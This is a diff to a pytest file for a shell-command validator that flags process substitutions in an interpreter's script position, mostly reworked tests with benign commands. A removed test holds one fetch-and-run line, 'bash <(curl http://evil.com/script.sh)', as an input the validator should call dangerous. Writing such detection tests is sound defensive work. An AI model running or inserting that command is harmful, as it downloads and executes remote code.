@@ -196,16 +196,6 @@ class TestProcessSubstitutionContext:
                 SubstitutionType.PROCESS_OUTPUT,
             )
 
-    def test_check_process_substitution_context(self, validator, parser):
-        """check_process_substitution_context is called for process subs."""
-        ast = parser.parse("bash <(curl http://evil.com/script.sh)")
-        subs = validator.extract_substitutions(ast)
-        if subs:
-            # The method takes (ast_nodes, sub_node) - note the order
-            is_dangerous, reason = validator.check_process_substitution_context(ast, subs[0])
-            assert is_dangerous is True
-            assert "'bash'" in reason
-
     def test_safe_process_substitution(self, validator, parser):
         """diff <(ls) is safe process substitution."""
         ast = parser.parse("diff <(ls dir1) <(ls dir2)")
@@ -1235,7 +1225,7 @@ class TestAmplifyRiskUnknownLevel:
 
 
 class TestCheckProcessSubstitutionContext:
-    """Test check_process_substitution_context (lines 847, 856-860, 875-880)."""
+    """Placement of a process substitution as an interpreter's script (LAB-4808)."""
 
     def test_command_substitution_skipped(self, validator):
         """Command substitution type returns not dangerous."""
@@ -1251,13 +1241,11 @@ class TestCheckProcessSubstitutionContext:
         result = validator.check_process_substitution_context([], node)
         assert result == (False, "")
 
-    # The mock-AST tests that stood here pinned the stub's reading - "the first word of the first
-    # top-level command" - which LAB-4808 replaced with an owner found by node identity. A mock
-    # command holding no substitution node has no owner, so they are now written on real parses.
     @staticmethod
     def _context(validator, parser, command):
         ast = parser.parse(command)
-        subs = [s for s in validator.extract_substitutions(ast) if s.substitution_type == SubstitutionType.PROCESS_INPUT]
+        subs = validator.extract_substitutions(ast, command=command)
+        assert subs, command
         return [validator.check_process_substitution_context(ast, sub) for sub in subs]
 
     @pytest.mark.parametrize(
@@ -1268,6 +1256,9 @@ class TestCheckProcessSubstitutionContext:
             ("/bin/bash <(echo x)", "bash"),
             ("{fd}>f bash <(ls)", "bash"),
             ("python3 -W ignore <(echo x)", "python3"),
+            ("bash +o history <(echo x)", "bash"),
+            # bashlex strips the quotes from a word's text; the direction is read from the source.
+            ("bash ''<(>(true); echo x)", "bash"),
             (". <(echo x)", "."),
         ],
     )
@@ -1287,6 +1278,7 @@ class TestCheckProcessSubstitutionContext:
             "source f <(echo x)",
             "bash < <(echo x)",  # stdin redirect, not an operand: outside LAB-4808
             "python3 >(cat)",  # an output substitution is a pipe the inner command reads
+            "bash ''>(cat)",
         ],
     )
     def test_not_a_script_position(self, validator, parser, command):
@@ -1300,47 +1292,6 @@ class TestCheckProcessSubstitutionContext:
         engine's to rate, and a real owner walk would have turned it into a blanket deny.
         """
         assert self._context(validator, parser, "rm <(echo f)") == [(False, "")]
-
-    def test_find_outer_command_no_match(self, validator):
-        """_find_outer_command with no matching node returns None."""
-
-        class MockNode:
-            kind = "other"
-
-        result = validator._find_outer_command([MockNode()], None)
-        assert result is None
-
-    def test_find_outer_command_no_parts(self, validator):
-        """_find_outer_command with command but no parts."""
-
-        class MockCmd:
-            kind = "command"
-
-        result = validator._find_outer_command([MockCmd()], None)
-        assert result is None
-
-    def test_find_outer_command_no_word(self, validator):
-        """_find_outer_command with parts but no word attribute."""
-
-        class MockPart:
-            kind = "word"
-
-        class MockCmd:
-            kind = "command"
-            parts = [MockPart()]
-
-        result = validator._find_outer_command([MockCmd()], None)
-        assert result is None
-
-    def test_find_outer_command_empty_list(self, validator):
-        """_find_outer_command with empty list returns None."""
-        result = validator._find_outer_command([], None)
-        assert result is None
-
-    def test_find_outer_command_none_list(self, validator):
-        """_find_outer_command with None returns None."""
-        result = validator._find_outer_command(None, None)
-        assert result is None
 
 
 class TestCommandNameSkipsFdVariablePrefix:
@@ -1394,8 +1345,7 @@ class TestCommandNameSkipsFdVariablePrefix:
         assert validator._has_brace_expansion_in_command(node) is brace
         assert validator._has_variable_as_command(node) is variable
 
-    # The stub named the first part with a `.word` and so read `None` for a leading prefix.
-    # The owner walk reads argv through command_word_parts, so all three name bash (LAB-4808).
+    # A leading prefix is not the name: argv is read through command_word_parts (LAB-4808).
     @pytest.mark.parametrize("command", ["{fd}>f bash <(ls)", "3>f bash <(ls)", "bash {fd}>f <(ls)"])
     def test_find_outer_command(self, validator, parser, command):
         ast = parser.parse(command)
